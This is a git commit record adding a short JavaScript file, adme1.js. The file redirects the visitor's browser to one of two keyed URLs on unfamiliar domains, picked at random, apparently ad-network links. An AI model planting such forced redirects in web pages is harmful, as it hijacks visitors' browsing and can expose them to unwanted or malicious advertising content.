951d20dcde4d431ad14d8440af973a95a9ebacf1
un13z <97453482+un13z@users.noreply.github.com>
2022-01-21 21:35:33 +0800

    Create adme1.js

---
+++ adme1.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+'https://plumbingcurlproximity.com/eivf1rjke?key=83661346f4f768305057daed32a4bb70',
+'https://backmerriment.com/c0fi5rrc5?key=48bbee5b0df45e5e4a8a17524638c45b'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
